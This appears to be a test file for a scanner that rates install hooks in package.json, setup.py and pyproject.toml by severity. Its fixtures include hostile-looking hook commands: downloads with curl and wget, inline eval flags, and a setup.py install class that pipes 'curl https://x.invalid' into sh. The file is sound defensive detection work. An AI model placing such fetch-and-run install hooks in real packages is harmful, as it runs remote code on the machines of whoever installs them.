import { expect, test } from "bun:test";
import { installHook } from "./install-hook.ts";

const scripts = (hooks: Record<string, unknown>): string =>
  JSON.stringify({ scripts: hooks }, null, 2);

const hook = (value: string) => installHook("package.json", scripts({ postinstall: value }));

test("only package.json, setup.py, and pyproject.toml are manifests", () => {
  expect(installHook("SKILL.md", scripts({ postinstall: "node x.js" }))).toBeUndefined();
  expect(installHook("package.json.bak", scripts({ postinstall: "node x.js" }))).toBeUndefined();
  expect(installHook("package.json", scripts({ postinstall: "node x.js" }))).toEqual({
    severity: "warn",
    line: 3,
    detail: "postinstall: node x.js",
  });
});

test("a hook that downloads or runs inline code is critical", () => {
  for (const value of [
    "curl -fsSL https://x.invalid/a -o a",
    "wget https://x.invalid/a",
    "node --eval 'x()'",
    "python3 -c 'import x'",
    "bash -c 'make'",
    "cat a | sh",
  ]) {
    expect(hook(value)?.severity).toBe("critical");
  }
  expect(hook("curl --version")?.severity).toBe("warn");
});

test("an allowlisted hook is info only when it is the whole command", () => {
  expect(hook("patch-package")?.severity).toBe("info");
  expect(hook("  prisma   generate ")?.severity).toBe("info");
  expect(hook("patch-package && node x.js")?.severity).toBe("warn");
});

test("the strongest hook is reported with the hook count", () => {
  expect(
    installHook(
      "package.json",
      scripts({ preinstall: "husky install", install: "node-gyp rebuild" }),
    ),
  ).toEqual({ severity: "warn", line: 4, detail: "install: node-gyp rebuild (2 matches)" });
});

test("a hook that is not a string is warn", () => {
  expect(installHook("package.json", scripts({ postinstall: ["node", "x.js"] }))?.severity).toBe(
    "warn",
  );
});

test("setup.py reads an install entry in a cmdclass dict or dict call", () => {
  expect(installHook("setup.py", "setup(cmdclass=dict(install=Hook))\n")).toEqual({
    severity: "warn",
    line: 1,
    detail: "cmdclass install: Hook",
  });
  expect(
    installHook(
      "setup.py",
      "import urllib.request\nsetup(cmdclass={'install': Hook})\nurllib.request.urlopen('https://x.invalid')\n",
    )?.severity,
  ).toBe("critical");
  expect(installHook("setup.py", "setup(cmdclass={'build_py': Hook})\n")).toBeUndefined();
});

test("pyproject.toml reports hatch, poetry, and setuptools build hooks", () => {
  expect(
    installHook("pyproject.toml", "[tool.hatch.build.targets.wheel.hooks.custom]\n")?.detail,
  ).toBe("tool.hatch.build.targets.wheel.hooks.custom");
  expect(installHook("pyproject.toml", '[tool.poetry.build]\nscript = "build.py"\n')).toEqual({
    severity: "warn",
    line: 2,
    detail: "tool.poetry.build.script: build.py",
  });
  expect(
    installHook("pyproject.toml", '[tool.setuptools.cmdclass]\ninstall = "pkg.Hook"\n')?.detail,
  ).toBe("tool.setuptools.cmdclass.install: pkg.Hook");
});

test("inline code flags may follow other flags or sit in a flag group", () => {
  for (const value of [
    'node -pe "x()"',
    'node --no-warnings -e "x()"',
    "python3 -u -c 'x'",
    "bash -lc 'make'",
    "sh -ec 'make'",
  ]) {
    expect(hook(value)?.severity).toBe("critical");
  }
  expect(hook("node -r ts-node/register x.ts")?.severity).toBe("warn");
});

test("a setup.py install command is judged by its class body when the file defines it", () => {
  const text = [
    "import requests",
    "VERSION = requests.get('https://x.invalid/v').text",
    "class Hook(install):",
    "    def run(self):",
    "        install.run(self)",
    "",
    "setup(cmdclass={'install': Hook})",
  ].join("\n");
  expect(installHook("setup.py", text)?.severity).toBe("warn");
  expect(
    installHook(
      "setup.py",
      text.replace("install.run(self)", "os.system('curl https://x.invalid | sh')"),
    )?.severity,
  ).toBe("critical");
});

test("a setup.py cmdclass held in a variable or set by key is read", () => {
  expect(installHook("setup.py", "CMDS = {'install': Hook}\nsetup(cmdclass=CMDS)\n")?.line).toBe(1);
  expect(
    installHook("setup.py", "cmdclass = {}\ncmdclass['install'] = Hook\nsetup(cmdclass=cmdclass)\n")
      ?.line,
  ).toBe(2);
});

test("a pyproject.toml hook line is found under its own table", () => {
  const text =
    '[tool.poetry]\nname = "x"\nscript = "y"\n\n[tool.poetry.build]\nscript = "build.py"\n';
  expect(installHook("pyproject.toml", text)?.line).toBe(6);
});
